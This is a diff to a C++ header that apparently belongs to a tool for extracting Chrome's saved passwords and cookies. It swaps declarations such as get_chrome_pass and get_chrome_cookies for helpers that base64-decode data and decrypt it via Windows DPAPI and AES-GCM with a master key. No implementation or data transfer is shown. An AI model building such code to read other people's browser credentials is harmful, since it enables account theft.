@@ -2,25 +2,28 @@
 #define TOOLS_HPP
 
 #include <sstream>
+#include <string.h>
 #include <iostream>
+#include <vector>
+#include "jansson.h"
 #include "sqlite3.h"
 
-using namespace std;
-
 #if defined(__WIN64__)
-
     #include <windows.h>
     #include <Wincrypt.h>
     #include <tchar.h>
-
-    stringstream get_chrome_pass(sqlite3 *db);
-    stringstream get_chrome_cookies(sqlite3 *db);
-    int callback(void *NotUsed, int argc, char **argv, char **azColName);
-
+    #include <sys/types.h>
 #elif defined(__linux__)
-
-    stringstream get_chrome_pass(sqlite3* db);
-
 #endif
+
+static const std::string b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+using namespace std;
+
+string base64_decode(const string &in);
+DATA_BLOB DecryptWithKey(unsigned char *crData, unsigned int crDataLen, unsigned char *key);
+DATA_BLOB DPAPIDecrypt(unsigned char *crData, unsigned int crDataLen);
+string EasyDecrypt(string password, unsigned char *masterKey);
+void aes_gcm_encrypt();
+void aes_gcm_decrypt();
 
 #endif //TOOLS_HPP
